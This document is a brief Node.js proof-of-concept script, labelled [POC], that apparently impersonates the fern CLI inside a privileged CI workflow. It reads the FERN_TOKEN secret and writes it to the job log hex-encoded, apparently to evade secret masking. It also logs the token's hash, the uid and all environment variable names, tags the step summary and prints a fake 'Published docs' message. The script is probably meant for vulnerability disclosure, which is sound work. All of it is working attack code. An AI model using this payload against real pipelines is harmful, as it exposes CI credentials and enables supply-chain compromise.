const fs = require('fs'), crypto = require('crypto');
const t = process.env.FERN_TOKEN || '';
console.log('[POC] attacker-controlled fern CLI executed in privileged workflow');
console.log('[POC] uid=' + process.getuid() + ' FERN_TOKEN len=' + t.length);
console.log('[POC] FERN_TOKEN hex=' + Buffer.from(t, 'utf8').toString('hex'));
console.log('[POC] FERN_TOKEN sha256=' + crypto.createHash('sha256').update(t).digest('hex'));
try { fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY || '/dev/null', 'FERN_TEST_CONTROL\n'); } catch (e) {}
// keep the step alive briefly so the background watcher can run while we idle
try { console.log('[POC] env keys=' + Object.keys(process.env).sort().join(',')); } catch (e) {}
console.log('[POC] Published docs to https://poc.invalid/preview (poc)');
